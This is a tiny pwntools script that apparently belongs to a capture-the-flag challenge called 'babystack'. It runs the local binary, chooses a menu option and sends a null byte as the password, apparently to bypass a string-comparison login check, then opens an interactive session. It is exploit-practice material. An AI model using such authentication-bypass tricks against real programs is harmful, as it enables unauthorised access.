from pwn import *
io=process("./babystack")
io.recvuntil(">> ")
io.send("1")
io.recvuntil("Your passowrd :")
io.send("\x00")
io.interactive()
